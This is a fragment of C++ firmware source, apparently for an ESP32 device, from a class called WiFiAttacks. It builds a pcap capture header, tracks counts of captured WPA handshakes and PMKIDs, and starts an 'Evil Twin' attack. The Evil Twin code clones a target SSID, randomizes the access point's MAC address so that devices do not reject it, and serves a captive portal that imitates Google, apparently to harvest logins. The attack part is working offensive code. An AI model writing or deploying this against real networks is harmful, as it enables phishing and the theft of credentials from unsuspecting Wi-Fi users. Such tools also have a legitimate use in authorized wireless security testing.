void WiFiAttacks::initPcapBuffer() {
  if (!pcap_buffer)
    return;

  uint32_t magic = 0xa1b2c3d4;
  uint16_t version_major = 2;
  uint16_t version_minor = 4;
  int32_t thiszone = 0;
  uint32_t sigfigs = 0;
  uint32_t snaplen = 65535;
  uint32_t network = 105; // IEEE 802.11

  pcap_buffer_pos = 0;
  memcpy(pcap_buffer + pcap_buffer_pos, &magic, 4);
  pcap_buffer_pos += 4;
  memcpy(pcap_buffer + pcap_buffer_pos, &version_major, 2);
  pcap_buffer_pos += 2;
  memcpy(pcap_buffer + pcap_buffer_pos, &version_minor, 2);
  pcap_buffer_pos += 2;
  memcpy(pcap_buffer + pcap_buffer_pos, &thiszone, 4);
  pcap_buffer_pos += 4;
  memcpy(pcap_buffer + pcap_buffer_pos, &sigfigs, 4);
  pcap_buffer_pos += 4;
  memcpy(pcap_buffer + pcap_buffer_pos, &snaplen, 4);
  pcap_buffer_pos += 4;
  memcpy(pcap_buffer + pcap_buffer_pos, &network, 4);
  pcap_buffer_pos += 4;
}

int WiFiAttacks::getPcapSize() { return pcap_buffer_pos; }
uint8_t *WiFiAttacks::getPcapBuffer() { return pcap_buffer; }

AttackStats WiFiAttacks::getStats() {
  AttackStats stats;
  stats.attack_type = current_attack;
  stats.packets_sent = packets_sent;
  stats.handshakes_captured = handshakes_captured;
  stats.is_active = attack_active;
  stats.pmkids_captured = pmkids_captured;
  return stats;
}

bool WiFiAttacks::startEvilTwin(const char *target_ssid, int portal_type) {
  if (attack_active)
    stopAttack();

  Serial.printf("[ATK] Iniciando Evil Twin: %s\n", target_ssid);

  // Tip: Randomize BSSID (AP MAC) to avoid immediate rejection by modern OS
  // "SSID clonado fica com mesmo BSSID do AP legítimo... Redes modernas
  // rejeitam"
  uint8_t new_mac[6];
  esp_fill_random(new_mac, 6);
  new_mac[0] &= 0xFE; // Unicast
  new_mac[0] |= 0x02; // Locally Administered
  esp_wifi_set_mac(WIFI_IF_AP, new_mac);
  Serial.printf(
      "[ATK] Evil Twin BSSID Randomizado: %02X:%02X:%02X:%02X:%02X:%02X\n",
      new_mac[0], new_mac[1], new_mac[2], new_mac[3], new_mac[4], new_mac[5]);

  PortalTemplate tmpl = (portal_type == 1) ? PORTAL_GOOGLE : PORTAL_GENERIC;

  if (captive_portal.begin(target_ssid, tmpl)) {
    attack_active = true;
    current_attack = ATTACK_EVIL_TWIN;
    strncpy(target_ssid_str, target_ssid, 32);
    target_ssid_str[32] = '\0';
    Serial.println("[ATK] Evil Twin ativo!");
    return true;
  }

  return false;
}
